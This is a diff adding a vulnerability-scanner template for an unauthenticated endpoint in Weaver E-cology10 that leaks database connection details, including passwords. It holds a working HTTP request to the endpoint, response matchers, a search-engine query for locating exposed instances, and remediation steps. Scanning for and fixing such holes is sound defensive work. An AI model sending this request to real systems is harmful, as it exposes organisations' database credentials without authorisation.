@@ -1,0 +1,59 @@
+id: weaver-ecology10-getemdslist-unauth-infoleak
+
+info:
+  name: Weaver E-cology10 getEmDsList - Unauthenticated Database Information Disclosure
+  author: qwtd
+  severity: medium
+  description: |
+    Weaver E-cology10 exposes an unauthenticated information disclosure vulnerability in
+    /papi/em/transform/getEmDsList. An attacker can access this endpoint without authentication
+    and obtain sensitive datasource configuration details, including database URLs, usernames,
+    passwords, and driver information.
+  remediation: |
+    - Apply the vendor security patch or upgrade to a fixed version as soon as possible.
+    - Restrict public access to /papi/em/transform/* and related management endpoints.
+    - Enforce authentication and authorization checks on the affected API.
+    - Rotate any exposed database credentials and review logs for unauthorized access.
+  impact: |
+    Successful exploitation may disclose database connection strings, usernames, passwords,
+    internal network addresses, and driver details. This information can be leveraged for
+    further compromise, lateral movement, or direct database access.
+  reference:
+    - https://mp.weixin.qq.com/s/x4gZQh-XbpwBbNTkf0z6AQ
+  classification:
+    cwe-id: CWE-200
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  metadata:
+    vendor: weaver
+    product: e-cology10
+    verified: true
+    max-request: 1
+    fofa-query: app="泛微-OA（e-cology）"
+    vuln-labels: OA
+  tags: 泛微-协同办公OA
+
+http:
+  - raw:
+      - |
+        GET /papi/em/transform/getEmDsList HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: langType=zh_CN
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "spring.datasource"
+          - "\"dsKey\""
+          - "\"dsDes\""
+        condition: and
